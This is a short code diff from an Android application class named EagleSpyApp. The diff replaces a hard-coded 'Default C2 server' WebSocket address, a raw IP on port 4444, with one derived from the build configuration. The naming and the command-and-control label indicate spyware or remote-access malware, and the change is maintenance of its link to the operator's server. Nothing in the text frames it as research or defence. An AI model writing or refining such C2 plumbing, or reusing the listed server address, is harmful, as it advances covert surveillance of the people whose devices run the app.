@@ -32,8 +32,8 @@ class EagleSpyApp : Application(), Configuration.Provider {
         private const val KEY_DEVICE_ID = "device_id"
         private const val KEY_SERVER_URL = "server_url"
         
-        // Default C2 server
-        private const val DEFAULT_SERVER_URL = "ws://213.91.211.150:4444/cable"
+        // Default C2 server — derived from build config
+        private val DEFAULT_SERVER_URL = BuildConfig.SERVER_BASE_URL.replace("http", "ws") + "/cable"
         
         private var instance: EagleSpyApp? = null
         
